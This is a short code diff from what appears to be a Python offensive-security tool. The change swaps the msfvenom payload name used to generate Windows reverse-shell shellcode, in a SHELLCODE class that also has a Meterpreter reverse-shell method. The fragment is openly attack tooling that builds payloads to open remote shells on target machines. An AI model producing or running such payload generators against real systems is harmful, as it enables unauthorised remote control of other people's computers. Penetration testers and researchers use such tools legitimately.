@@ -51,7 +51,7 @@ class HANDLER(SimpleHTTPServer.SimpleHTTPRequestHandler): #patching httpserver t
 class SHELLCODE(object):
     @staticmethod
     def windows_rev_shell(ip, port):
-        return msfvenomGeneration('windows/shell/reverse_tcp', ip, port)
+        return msfvenomGeneration('windows/shell_reverse_tcp', ip, port)
 
     @staticmethod
     def windows_met_rev_shell(ip, port):
